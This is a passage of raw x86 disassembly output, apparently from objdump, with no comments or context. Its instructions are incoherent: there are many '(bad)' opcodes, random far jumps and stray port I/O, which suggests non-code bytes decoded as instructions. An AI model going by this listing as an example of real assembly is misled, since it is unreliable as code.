  415746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415747:	inc    ecx
  415748:	jne    0x4156d8
  41574a:	jmp    0xcd70:0xda8174f7
  415751:	cld    
  415752:	jp     0x415740
  415754:	stos   BYTE PTR es:[edi],al
  415755:	enter  0xe739,0xf5
  415759:	std    
  41575a:	call   DWORD PTR [edi+0x3bb464a]
  415760:	inc    ebp
  415761:	add    eax,0xce8f4e85
  415766:	push   ebp
  415767:	stos   DWORD PTR es:[edi],eax
  415768:	push   edx
  415769:	mov    eax,es:0x5bc17199
  41576f:	push   0xffffffcf
  415771:	pop    ecx
  415772:	mov    eax,ss:0xfe1bf420
  415778:	aad    0x48
  41577a:	mov    ds:0xd01bcfc6,al
  41577f:	es popa 
  415781:	dec    ecx
  415782:	push   ecx
  415783:	mov    ecx,0x2a3cfb4e
  415788:	add    BYTE PTR [ebx+0x3c],dl
  41578b:	or     al,0xfb
  41578d:	xor    al,0x95
  41578f:	popa   
  415790:	std    
  415791:	jp     0x4157c2
  415793:	mov    esi,0x32797a85
  415798:	jae    0x41575c
  41579a:	mov    eax,0xb2a7f7c3
  41579f:	es mov edx,0x258d767
  4157a5:	icebp  
  4157a6:	fstp   DWORD PTR [eax]
  4157a8:	push   ecx
  4157a9:	pop    ss
  4157aa:	xchg   DWORD PTR [edi-0x16],ecx
  4157ad:	(bad)  
  4157ae:	in     al,dx
  4157af:	push   es
  4157b0:	or     al,0x4b
  4157b2:	add    eax,0xfaf5
	...
  415813:	add    BYTE PTR [eax],al
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx+0x2aae69e3]
  415823:	(bad)  
  415824:	cmp    al,0x41
  415826:	fs loopne 0x415829
  415829:	add    BYTE PTR [edi],al
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    dl,bh
  41582f:	retf   
  415830:	inc    esp
  415831:	jno    0x41585f
  415833:	adc    bh,ah
  415835:	mov    esi,0x2f1dec42
  41583a:	ffreep st(2)
  41583c:	and    ebp,DWORD PTR [ebx]
  41583e:	sub    BYTE PTR [edi+0x5e62e1cc],0x8c
  415845:	popf   
  415846:	jne    0x4158af
  415848:	in     al,dx
  415849:	pop    ebx
  41584a:	gs (bad) 
  41584c:	scas   al,BYTE PTR es:[edi]
  41584d:	(bad)  
  41584e:	dec    esi
  41584f:	int3   
  415850:	jl     0x415883
  415852:	sti    
  415853:	pop    ebp
  415854:	std    
  415855:	jo     0x4158c1
  415857:	lock pusha 
  415859:	xor    bh,BYTE PTR cs:[eax+0x2c70d53e]
  415860:	dec    ecx
  415861:	jg     0x415800
  415863:	fisubr WORD PTR [ecx-0x9]
  415866:	add    bh,ah
  415868:	cmp    BYTE PTR [esp+edx*2+0x3a],dl
  41586c:	(bad)  
  41586d:	in     eax,dx
  41586e:	out    dx,eax
  41586f:	jns    0x41580d
  415871:	mov    dl,0xfc
  415873:	xor    bh,BYTE PTR [edx-0x4690df87]
  415879:	cmp    bh,BYTE PTR [ecx]
  41587b:	xor    edi,ecx
  41587d:	sub    esi,edi
  41587f:	xchg   esi,eax
  415880:	jnp    0x4158d5
  415882:	(bad)  
  415884:	and    al,0xbf
  415886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415888:	lods   al,BYTE PTR ds:[esi]
  415889:	bound  esi,QWORD PTR ss:[bp+si]
  41588d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41588e:	push   0x4b
  415890:	lea    ebp,[esi+0xe]
  415893:	dec    ecx
  415894:	inc    eax
  415895:	popa   
  415896:	inc    ebx
  415897:	sub    DWORD PTR [edi],edx
  415899:	mov    ebx,0x848cd1a8
  41589e:	inc    esp
  41589f:	cmp    eax,edx
  4158a1:	cmp    ah,al
  4158a3:	push   0x4b
  4158a5:	mov    fs,WORD PTR [esi]
  4158a7:	mov    bl,0x7
  4158a9:	in     al,dx
  4158aa:	cwde   
  4158ab:	clc    
  4158ac:	pop    ebp
  4158ad:	cmp    ebx,DWORD PTR fs:[esi-0x8e2316]
  4158b4:	jno    0x4158d7
  4158b6:	imul   edi,ecx,0x1128b82a
  4158bc:	push   0xfa4f31e9
  4158c1:	ret    
  4158c2:	sar    DWORD PTR [edi+0x7514aa07],1
  4158c8:	imul   ebx,DWORD PTR [eax-0x2b],0xdfdc436f
  4158cf:	jae    0x4158ea
  4158d1:	mov    al,0xe4
  4158d3:	lahf   
  4158d4:	xor    bh,BYTE PTR fs:[edi+0x22]
  4158d8:	loop   0x415926
  4158da:	adc    DWORD PTR [edx+0x4],edi
  4158dd:	xchg   esi,eax
  4158de:	stc    
  4158df:	xor    edx,DWORD PTR [eax+0x61ac7b08]
  4158e5:	add    al,0xc9
  4158e7:	inc    esi
  4158e8:	push   edx
  4158e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ea:	mov    esp,0x72379405
  4158ef:	shl    BYTE PTR [ebx],0xcf
  4158f2:	mov    ?,WORD PTR [esp+edx*2-0x3c]
  4158f6:	and    esi,DWORD PTR [ecx-0x70]
  4158f9:	test   eax,0x36aeb732
  4158fe:	add    ebp,DWORD PTR [edx-0x1b1d04a9]
  415904:	mov    al,0x54
  415906:	scas   al,BYTE PTR es:[edi]
  415907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415908:	cli    
  415909:	xchg   ecx,eax
  41590a:	fbstp  TBYTE PTR [ecx-0x7ff1b5f2]
  415910:	add    al,BYTE PTR [esp+ebx*4]
  415913:	sub    eax,0xdf3d5bd5
  415918:	push   eax
  415919:	lahf   
  41591a:	mov    eax,0x96eeccf6
  41591f:	adc    DWORD PTR [ebx+0xb],0x49
  415923:	xor    eax,ecx
  415925:	sub    edx,DWORD PTR [ecx-0x43dbfcb0]
  41592b:	cmc    
  41592c:	cmp    ah,ah
  41592e:	add    BYTE PTR ds:0xce19e044,0xb3
	...
  415995:	add    BYTE PTR [ebp-0x78],al
  415998:	sub    al,0x77
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0x3d
  4159a3:	mov    dl,BYTE PTR [ecx+0xa]
  4159a6:	imul   esp,ecx,0x0
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [ecx],ch
  4159af:	sub    esi,DWORD PTR [edx+edi*8]
  4159b2:	pop    esi
  4159b3:	add    eax,0xc2494244
  4159b8:	sar    ecx,1
  4159ba:	or     ecx,0x6c
  4159bd:	mov    esp,0xfc20f7e0
  4159c2:	aam    0x28
  4159c4:	cmp    DWORD PTR [ecx+0x2b],0x7765a400
  4159cb:	hlt    
  4159cc:	add    edx,DWORD PTR [edi+0x1c]
  4159cf:	xchg   edx,eax
  4159d0:	ja     0x415956
  4159d2:	jmp    0x415a10
  4159d4:	in     al,dx
  4159d5:	mov    al,0xdd
  4159d7:	push   ebx
  4159d8:	sbb    dh,BYTE PTR [ecx-0x2c]
  4159db:	xor    DWORD PTR es:[ebx-0x77a1d3cd],esp
  4159e2:	and    esp,DWORD PTR [ebp+eax*8+0x7d114331]
  4159e9:	dec    eax
  4159ea:	mov    esp,0xf076629c
  4159ef:	adc    BYTE PTR [edi-0x28b34655],dl
  4159f5:	retf   
  4159f6:	ffreep st(1)
  4159f8:	pop    edx
  4159f9:	es pop ebx
  4159fb:	fwait
  4159fc:	mov    bh,0x28
  4159fe:	das    
  4159ff:	push   ss
  415a00:	jns    0x4159c4
  415a02:	jne    0x4159a4
  415a04:	push   0x69679ac3
  415a09:	les    esi,FWORD PTR [edx+0x71]
  415a0c:	fidivr DWORD PTR [ebp+0x4e3450d6]
  415a12:	jbe    0x415a8c
  415a14:	clc    
  415a15:	mov    eax,0x3ccc6386
  415a1a:	shl    BYTE PTR [edx],0x4c
  415a1d:	push   esp
  415a1e:	fdiv   QWORD PTR [esi-0x196315ab]
  415a24:	retf   0x5487
  415a27:	jne    0x415a5a
  415a29:	inc    eax
  415a2a:	fisub  WORD PTR [ebp-0x6ff155d4]
  415a30:	jl     0x4159bb
  415a32:	call   0x583720d5
  415a37:	adc    al,0x85
  415a39:	push   0xffffffaf
  415a3b:	mov    bl,0x2d
  415a3d:	pop    ds
  415a3e:	lock sub bh,BYTE PTR [ebx-0x26436beb]
  415a45:	test   dh,ch
  415a47:	outs   dx,BYTE PTR ds:[esi]
  415a48:	jle    0x415a4b
  415a4a:	mov    esp,ss
  415a4c:	scas   al,BYTE PTR es:[di]
  415a4e:	imul   ecx,esp,0xde084751
  415a54:	mov    ch,0x6c
  415a56:	push   ebp
  415a57:	(bad)  
  415a58:	push   esp
  415a59:	(bad)  
  415a5a:	mov    BYTE PTR [ecx],ah
  415a5c:	add    al,0x79
  415a5e:	push   edx
  415a5f:	inc    esi
  415a60:	in     eax,dx
  415a61:	sbb    BYTE PTR [eiz*1+0x64739c85],dl
  415a68:	int    0x78
  415a6a:	ds xchg ebp,eax
  415a6c:	aaa    
  415a6d:	inc    esi
  415a6e:	std    
  415a6f:	sbb    bh,BYTE PTR [esi-0x12]
  415a72:	adc    DWORD PTR [eax],esp
  415a74:	mov    edi,0x105d30f3
  415a79:	enter  0xf51e,0x99
  415a7d:	cwde   
  415a7e:	or     al,0x60
  415a80:	mov    ebx,0x8edd9719
  415a85:	inc    edi
  415a86:	into   
  415a87:	daa    
  415a88:	add    bl,BYTE PTR ds:0x5e4c6127
  415a8e:	(bad)  
  415a8f:	push   dx
  415a91:	and    eax,0x5976bd38
  415a96:	jge    0x415ad6
  415a98:	and    BYTE PTR [ecx-0xe],0xa8
  415a9c:	imul   edx,DWORD PTR [edi+0x16],0xffffffc6
  415aa0:	inc    ebx
  415aa1:	fistp  DWORD PTR gs:[ebp-0x512cbacc]
  415aa8:	xor    BYTE PTR [ecx-0xb6569c8],bh
  415aae:	retf   
  415aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab0:	cmp    eax,0x4795e5d8
	...
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0x75cfe76e
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [eax+0x4],bh
  415b30:	or     BYTE PTR [edi+0x5433868b],bh
  415b36:	mov    dl,0x73
  415b38:	daa    
  415b39:	popf   
  415b3a:	mov    bh,bl
  415b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b3d:	xchg   BYTE PTR [esi+0x54],bl
  415b40:	imul   ecx,DWORD PTR [ebx],0x959a1e20
  415b46:	mov    ebp,0x3765fe04
  415b4b:	(bad)  
  415b4c:	(bad)  
  415b4d:	adc    al,0x1b
  415b4f:	shr    BYTE PTR [ecx+0x2a4e52d2],0x8
  415b56:	mov    edi,DWORD PTR [ebp+0x55]
  415b59:	xchg   edx,eax
  415b5a:	mov    edi,0x60b0f197
  415b5f:	in     eax,0x77
  415b61:	jmp    0xe929:0x7f7ebdb9
  415b68:	clc    
  415b69:	sbb    BYTE PTR [edi-0x6e5859c],0x9a
  415b70:	push   0xffffffb7
  415b72:	xlat   BYTE PTR ds:[ebx]
  415b73:	pop    eax
  415b74:	jbe    0x415b9d
  415b76:	mov    eax,ds:0xde8831fe
  415b7b:	jle    0x415b60
  415b7d:	push   0xa0f492ad
  415b82:	inc    BYTE PTR [edi+0x3bf47dd9]
  415b88:	repnz loope 0x415b37
  415b8b:	les    edx,FWORD PTR [edx]
  415b8d:	pop    es
  415b8e:	jo     0x415c0b
  415b90:	(bad)  
  415b91:	lods   al,BYTE PTR ds:[esi]
  415b92:	jecxz  0x415be3
  415b94:	jp     0x9b9e06a4
  415b9a:	(bad)  
  415b9b:	mov    bh,0xd4
  415b9d:	sti    
  415b9e:	mov    DWORD PTR ds:0x6180a069,esi
  415ba4:	pop    esi
  415ba5:	adc    ah,dh
  415ba7:	lahf   
  415ba8:	dec    eax
  415ba9:	jns    0x415bcd
  415bab:	sar    BYTE PTR [edx],1
  415bad:	lock inc eax
  415baf:	ror    BYTE PTR [ebx-0x1694c5d8],0xf6
  415bb6:	push   cs
  415bb7:	mov    esp,0xcabd592a
  415bbc:	out    dx,eax
  415bbd:	jbe    0x415b48
  415bbf:	fwait
  415bc0:	ja     0x415c1f
  415bc2:	add    DWORD PTR [ecx+0x32],esp
  415bc5:	imul   esi,ebx,0xcea45526
  415bcb:	mov    dl,0xc9
  415bcd:	cmp    DWORD PTR [esi-0x58],ebp
  415bd0:	pusha  
  415bd1:	sti    
  415bd2:	inc    eax
  415bd3:	(bad)  [ebx-0x154e4bbe]
  415bd9:	and    al,0x44
  415bdb:	or     eax,0xd3305bb6
  415be0:	sub    al,0x5
  415be2:	mov    al,0x6b
  415be4:	and    al,0xc4
  415be6:	mov    cl,0xd8
  415be8:	mov    eax,0xc963f343
  415bed:	mov    dl,0x21
  415bef:	dec    esi
  415bf0:	push   esi
  415bf1:	push   0x5
  415bf3:	rol    edi,0x7f
  415bf6:	sub    bl,dl
  415bf8:	popa   
  415bf9:	loope  0x415b93
  415bfb:	adc    DWORD PTR [eax+0x2b],edi
  415bfe:	mov    cl,0xe1
  415c00:	das    
  415c01:	popa   
  415c02:	imul   ecx
  415c04:	mov    edi,0xd3839880
  415c09:	or     al,0x37
  415c0b:	inc    ebx
  415c0c:	ja     0x415c77
  415c0e:	lock ja 0x415bdb
  415c11:	jmp    0x415ba9
  415c13:	(bad)  
  415c14:	sub    eax,0xd72c09bd
  415c19:	cmp    BYTE PTR [ebx+0x5],ch
  415c1c:	push   ebp
  415c1d:	xchg   ecx,eax
  415c1e:	(bad)  
  415c20:	mov    ebx,edi
  415c22:	cld    
  415c23:	add    al,0xb1
  415c25:	add    ah,dh
  415c27:	test   BYTE PTR [edx+0x5243d03],bl
  415c2d:	mul    BYTE PTR [eax]
  415c2f:	adc    al,0x49
  415c31:	(bad)  
  415c32:	fdivr  DWORD PTR [ecx]
  415c34:	cwde   
	...
  415c95:	add    BYTE PTR [edx],bh
  415c97:	adc    BYTE PTR [edi-0x444040c4],bh
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0xf672da0f
  415ca5:	imul   edi,DWORD PTR [ecx-0x1d],0x0
  415ca9:	add    BYTE PTR [edi],al
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    BYTE PTR [esi+0x1f],al
  415cb0:	pop    ds
  415cb1:	gs jl  0x415d06
  415cb4:	adc    al,0xb6
  415cb6:	or     cl,BYTE PTR [edi]
  415cb8:	and    al,0xf2
  415cba:	jmp    FWORD PTR ds:0x4317b486
  415cc0:	cmp    al,0xd0
  415cc2:	or     eax,DWORD PTR [ebx]
  415cc4:	or     BYTE PTR [eax+0x40],ch
  415cc7:	jo     0x415d00
  415cc9:	jb     0x415d3a
  415ccb:	(bad)  
  415ccc:	mov    ah,0x3b
  415cce:	test   DWORD PTR ds:0xb977da20,ebx
  415cd4:	or     BYTE PTR [ebx+0x4d57a64b],dl
  415cda:	call   0xee6637eb
  415cdf:	adc    ebp,DWORD PTR [edx-0x47]
  415ce2:	pop    ecx
  415ce3:	fidivr DWORD PTR [ecx+0x2cb296dc]
  415ce9:	mov    ds:0x9f4c4d31,al
  415cee:	cmp    BYTE PTR [ecx],ah
  415cf0:	sbb    cl,ah
  415cf2:	pop    edi
  415cf3:	ret    0xa71f
  415cf6:	les    esp,FWORD PTR [ebx-0x71cdb25d]
  415cfc:	retf   
  415cfd:	sub    BYTE PTR [ebx],bl
  415cff:	and    DWORD PTR [eax],edi
  415d01:	pop    ds
  415d02:	in     al,dx
  415d03:	cmp    eax,esi
  415d05:	inc    ebp
  415d06:	xor    al,0x26
  415d08:	daa    
  415d09:	repnz lods al,BYTE PTR ds:[esi]
  415d0b:	push   edx
  415d0c:	test   DWORD PTR [edx+0x6f],eax
  415d0f:	aad    0x61
  415d11:	pop    ebx
  415d12:	stos   BYTE PTR es:[edi],al
  415d13:	mov    bh,0x20
  415d15:	jmp    0xc2af05eb
  415d1a:	cmp    bh,BYTE PTR [edi+0x36]
  415d1d:	push   ecx
  415d1e:	dec    eax
  415d1f:	bound  edx,QWORD PTR [ebx]
  415d21:	in     eax,dx
  415d22:	out    dx,al
  415d23:	mov    eax,0x6baf8ae5
  415d28:	mov    ecx,0xc35a5a6d
  415d2d:	pushf  
  415d2e:	or     cl,BYTE PTR [eax]
  415d30:	retf   0x613c
  415d33:	shl    DWORD PTR [ebp+0x2c],0xb4
  415d37:	mov    ds:0xc944f0bd,eax
  415d3c:	popf   
  415d3d:	pop    edi
  415d3e:	ins    DWORD PTR es:[edi],dx
  415d3f:	adc    eax,0xf3fcf0bb
  415d44:	fisub  DWORD PTR [esi]
  415d46:	stos   DWORD PTR es:[edi],eax
  415d47:	scas   al,BYTE PTR es:[edi]
  415d48:	cmp    al,0x53
  415d4a:	mov    al,0xb9
  415d4c:	and    eax,0x8e94a6a6
  415d51:	xor    eax,0xfcdb3cd5
  415d56:	in     al,dx
  415d57:	jne    0x415d02
  415d59:	mov    dh,0xcc
  415d5b:	test   eax,0x3ce0b1c7
  415d60:	mov    bl,0x30
  415d62:	mov    al,BYTE PTR [esi+0x1b4f3b8]
  415d68:	cld    
  415d69:	xor    al,0x6f
  415d6b:	test   al,bl
  415d6d:	nop
  415d6e:	or     BYTE PTR [esi-0x10],bh
  415d71:	(bad)  
  415d72:	inc    ebp
  415d73:	pop    edi
  415d74:	jnp    0x415d4d
  415d76:	mov    edx,0x5d4d7523
  415d7b:	adc    eax,0xfc44d6c9
  415d80:	aam    0x5c
  415d82:	push   esp
  415d83:	fs or  al,0x40
  415d86:	add    DWORD PTR [ebx],ebp
  415d88:	xchg   BYTE PTR [ecx-0x33fe088f],bl
  415d8e:	fldenv [ecx+ebx*1-0x1ae17687]
  415d95:	sub    DWORD PTR [edi],esp
  415d97:	sti    
  415d98:	test   BYTE PTR [esi],0x72
  415d9b:	cmp    BYTE PTR [edx],dl
  415d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d9e:	sahf   
  415d9f:	rol    edx,cl
  415da1:	pushf  
  415da2:	pop    ebp
  415da3:	arpl   bp,bp
  415da5:	pop    ebx
  415da6:	loop   0x415de2
  415da8:	inc    ebp
  415da9:	outs   dx,BYTE PTR ds:[esi]
  415daa:	dec    edx
  415dab:	and    DWORD PTR [esi+edi*2],eax
  415dae:	push   ss
  415daf:	arpl   WORD PTR [eax-0x5deea860],di
	...
  415e15:	add    dh,ch
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x805d5606
  415e24:	xchg   edi,eax
  415e25:	adc    DWORD PTR [eax+0x70000e4],eax
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    dl,cl
  415e2f:	adc    eax,0x8990ec64
  415e34:	loop   0x415eb5
  415e36:	sub    DWORD PTR [edx-0x5b14c56],ebx
  415e3c:	mov    edx,0xbef2e495
  415e41:	fidiv  DWORD PTR es:[edi]
  415e44:	fcomp  QWORD PTR [eax+0x7f1befc2]
  415e4a:	or     edx,0x54
  415e4d:	test   DWORD PTR [eax-0x40],ecx
  415e50:	sub    DWORD PTR [eax-0x2d],ebp
  415e53:	jne    0x415e14
  415e55:	jge    0x415de6
  415e57:	add    cl,dh
  415e59:	icebp  
  415e5a:	cmp    BYTE PTR [eax],dl
  415e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5d:	repz int 0xe7
  415e60:	jl     0x415ed9
  415e62:	sti    
  415e63:	pop    es
  415e64:	cli    
  415e65:	pop    edi
  415e66:	pop    esp
  415e67:	sbb    cl,BYTE PTR [eax+0x329ceaac]
  415e6d:	pop    edi
  415e6e:	mov    esi,0x34b61b00
  415e73:	sub    ch,BYTE PTR [edi]
  415e75:	div    DWORD PTR [edi]
  415e77:	and    bh,0x85
  415e7a:	jge    0x415e3d
  415e7c:	sar    DWORD PTR [edx+0x535401bd],1
  415e82:	cmp    edx,DWORD PTR [ebx]
  415e84:	add    esp,0x10879f89
  415e8a:	sub    DWORD PTR [edi+ebx*1],ecx
  415e8d:	pop    edi
  415e8e:	shr    DWORD PTR [edx+0x762d7c94],cl
  415e94:	test   cl,dl
  415e96:	push   ebx
  415e97:	fimul  WORD PTR [ebx-0x36e10c14]
  415e9d:	inc    ebx
  415e9e:	std    
  415e9f:	jmp    0x2335f81a
  415ea4:	dec    ebx
  415ea5:	adc    ah,al
  415ea7:	push   ss
  415ea8:	push   eax
  415ea9:	mov    ds:0x1e08f910,eax
  415eae:	ror    esi,0x58
  415eb1:	adc    esi,DWORD PTR [ebx+edx*2+0x486a1c23]
  415eb8:	sar    DWORD PTR [ecx-0x14],1
  415ebb:	push   eax
  415ebc:	imul   ebx,ebp,0xffffffc0
  415ebf:	iret   
  415ec0:	test   DWORD PTR [edi-0x4a157639],ecx
  415ec6:	stos   DWORD PTR es:[edi],eax
  415ec7:	jns    0x415ed5
  415ec9:	mov    edi,0x49a83c1
  415ece:	push   esi
  415ecf:	sub    edx,DWORD PTR [ecx+0xad1c55f]
  415ed5:	int3   
  415ed6:	lahf   
  415ed7:	mov    ecx,0xc64352bf
  415edc:	lock lods eax,DWORD PTR ds:[esi]
  415ede:	dec    edi
  415edf:	pop    ds
  415ee0:	push   ebx
  415ee1:	mov    ecx,0xb3df669a
  415ee6:	add    eax,0x64fb08a
  415eeb:	xchg   edi,eax
  415eec:	inc    eax
  415eed:	mov    dh,0x82
  415eef:	lods   eax,DWORD PTR ds:[esi]
  415ef0:	cmp    ch,0x62
  415ef3:	(bad)  
  415ef4:	sbb    al,0xdd
  415ef6:	(bad)  
  415ef7:	call   0xada0882e
  415efc:	xchg   esi,eax
  415efd:	fcmovne st,st(5)
  415eff:	jmp    0xffb:0xffe68d6f
  415f06:	jbe    0x415e90
  415f08:	hlt    
  415f09:	test   eax,0x2e291a11
  415f0e:	or     al,ch
  415f10:	sub    ecx,DWORD PTR [edx+ebx*1]
  415f13:	mov    ebx,0xf2957c13
  415f18:	push   ebx
  415f19:	sub    al,0xc4
  415f1b:	ret    0x3637
  415f1e:	or     dh,BYTE PTR [eax-0x3418d31b]
  415f24:	sub    cl,BYTE PTR [esi]
  415f26:	mov    esi,0x196d4989
  415f2b:	and    cl,0xc1
  415f2e:	mov    eax,ds:0xc20137a9
  415f33:	sbb    BYTE PTR [eax+0x0],cl
	...
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	mov    ds:0x87a4d9af,eax
  415fa7:	in     eax,0x0
  415fa9:	add    BYTE PTR [edi],al
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    dl,dl
  415faf:	out    dx,eax
  415fb0:	aam    0xf3
  415fb2:	mov    esi,0x5812767f
  415fb7:	sub    edi,DWORD PTR [esi]
  415fb9:	arpl   WORD PTR [edi+edx*4-0x5b72e85d],si
  415fc0:	jno    0x41602c
  415fc2:	sar    esp,1
  415fc4:	bnd jge 0x415f8e
  415fc7:	nop
  415fc8:	les    esi,FWORD PTR [ebp-0x3d08d284]
  415fce:	and    eax,DWORD PTR [ebx+0x3d]
  415fd1:	mov    esi,0xbcd2b24
  415fd6:	adc    ecx,DWORD PTR [eax-0x4a]
  415fd9:	sbb    eax,0xc0501d53
  415fde:	ds cmp bl,0x93
  415fe2:	imul   DWORD PTR [bp+di]
  415fe5:	sbb    al,0xd3
  415fe7:	mov    esi,0xb15eaadc
  415fec:	xchg   ebx,eax
  415fed:	pop    ebx
  415fee:	sbb    al,0x50
  415ff0:	pushf  
  415ff1:	adc    al,0x10
  415ff3:	outs   dx,BYTE PTR ds:[esi]
  415ff4:	pop    es
  415ff5:	popa   
  415ff6:	pushf  
  415ff7:	mov    bh,0x7c
  415ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ffa:	setns  BYTE PTR [edi]
  415ffd:	retf   
  415ffe:	sub    ah,BYTE PTR [esi]
  416000:	pop    eax
  416001:	das    
  416002:	push   edi
  416003:	inc    edx
  416004:	sub    al,0xde
  416006:	(bad)  
  416007:	cld    
  416008:	mov    esi,0xac1232c9
  41600d:	add    al,bh
  41600f:	in     eax,0xda
  416011:	and    eax,0x8e60dc61
  416016:	pop    esp
  416017:	(bad)  
  416018:	or     al,0xc7
  41601a:	add    bx,di
  41601d:	test   bh,ah
  41601f:	shr    al,1
  416021:	(bad)  
  416022:	sti    
  416023:	xchg   edi,eax
  416024:	mov    al,0xfc
  416026:	idiv   BYTE PTR [ebp+0x2d753893]
  41602c:	(bad)  
  41602d:	sub    DWORD PTR ds:0xca60d9a6,0xffffffea
  416034:	ss jg  0x41603d
  416037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416038:	scas   eax,DWORD PTR es:[edi]
  416039:	pavgb  mm6,QWORD PTR [eax-0x6a93ffa2]
  416040:	inc    esi
  416041:	mov    ds:0x86664f0e,al
  416046:	jmp    0x4314681
  41604b:	js     0x416013
  41604d:	into   
  41604e:	sub    DWORD PTR [ecx-0x57],ecx
  416051:	push   ecx
  416052:	in     eax,0x9d
  416054:	xor    ebx,DWORD PTR ds:0xcb95405f
  41605a:	jle    0x416076
  41605c:	scas   eax,DWORD PTR es:[edi]
  41605d:	xor    ah,BYTE PTR [eax]
  41605f:	inc    edi
  416060:	sahf   
  416061:	mov    cl,cl
  416063:	jge    0x416009
  416065:	jecxz  0x41609e
  416067:	shl    BYTE PTR [ecx],1
  416069:	mov    ds:0xc545d726,eax
  41606e:	push   ss
  41606f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416070:	mov    ds:0x3064ecbc,al
  416075:	gs jns 0x415ffa
  416078:	xor    BYTE PTR [esi+0x17],bh
  41607b:	dec    edi
  41607c:	pop    es
  41607d:	add    BYTE PTR [ebp+ebx*1-0x13ed3a31],ch
  416084:	lea    edx,[eax-0x1797d16f]
  41608a:	pushf  
  41608b:	xchg   ebx,eax
  41608c:	push   es
  41608d:	enter  0x4c3,0x53
  416091:	pop    ebx
  416092:	pushf  
  416093:	mov    WORD PTR [ecx],?
  416095:	(bad)  
  416096:	jl     0x4160be
  416098:	and    BYTE PTR [edi],bh
  41609a:	and    ebx,edi
  41609c:	xchg   edi,eax
  41609d:	sbb    BYTE PTR [ecx-0x69],al
  4160a0:	or     BYTE PTR [eax+esi*8],bl
  4160a3:	dec    ecx
  4160a4:	aad    0x2
  4160a6:	cdq    
  4160a7:	mov    ch,BYTE PTR [edi-0x47908b43]
  4160ad:	imul   ebp,DWORD PTR [ebx],0xec821d89
  4160b3:	std    
  4160b4:	fild   DWORD PTR [eax]
	...
  416116:	and    cl,ch
  416118:	cmp    ebx,esi
  41611a:	sti    
  41611b:	fsubrp st(5),st
  41611d:	jmp    DWORD PTR [edx]
  41611f:	fwait
  416120:	xchg   DWORD PTR [ecx],edx
  416122:	iret   
  416123:	dec    ebp
  416124:	std    
  416125:	adc    al,0x8e
  416127:	out    0x0,al
  416129:	add    BYTE PTR [edi],al
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    ch,ch
  41612f:	icebp  
  416130:	jbe    0x4160c8
  416132:	xor    eax,0xb919383e
  416137:	adc    al,0x0
  416139:	adc    eax,0x97b9b26
  41613e:	fimul  DWORD PTR [esi]
  416140:	push   eax
  416141:	mov    bh,0xd5
  416143:	jo     0x416119
  416145:	mov    ss,WORD PTR [eax-0x3aa65b99]
  41614b:	jmp    0x25ad:0xfe76e888
  416152:	call   DWORD PTR [eax]
  416154:	ret    0x96cc
  416157:	cmp    eax,0x8530386b
  41615c:	and    BYTE PTR [ecx+0x7],dh
  41615f:	mov    ecx,0x7257d751
  416164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416165:	inc    esp
  416166:	mov    edx,0x61a44a07
  41616b:	sub    cl,BYTE PTR [edx]
  41616d:	push   es
  41616e:	jecxz  0x41618e
  416170:	push   ss
  416171:	jle    0x41616e
  416173:	mov    bl,BYTE PTR [eax]
  416175:	sbb    BYTE PTR [edx-0x1ea7e81d],0xe8
  41617c:	jmp    0x4a3b7e3a
  416181:	ror    BYTE PTR [esi+0x3e],1
  416184:	inc    esi
  416185:	or     eax,0x5f6b3678
  41618a:	push   ebp
  41618b:	mov    esi,0xcc342e10
  416190:	push   eax
  416191:	add    esp,ecx
  416193:	shr    DWORD PTR [esi-0x1510b8cc],0x7f
  41619a:	push   ecx
  41619b:	push   edi
  41619c:	adc    eax,0xe99a16b6
  4161a1:	sub    eax,0xd182634d
  4161a6:	in     al,dx
  4161a7:	icebp  
  4161a8:	mov    edi,DWORD PTR [edi+0x62]
  4161ab:	push   esp
  4161ac:	cmc    
  4161ad:	xor    dh,ah
  4161af:	cmp    eax,0xa77c449a
  4161b4:	lods   al,BYTE PTR ds:[esi]
  4161b5:	rcr    edx,cl
  4161b7:	mov    ch,0x3e
  4161b9:	cmp    BYTE PTR [ebp-0x62],dh
  4161bc:	int3   
  4161bd:	pop    esi
  4161be:	arpl   cx,ax
  4161c0:	lods   eax,DWORD PTR ds:[esi]
  4161c1:	psubw  mm7,QWORD PTR [esi-0x11]
  4161c5:	and    DWORD PTR [edx-0x4b],esi
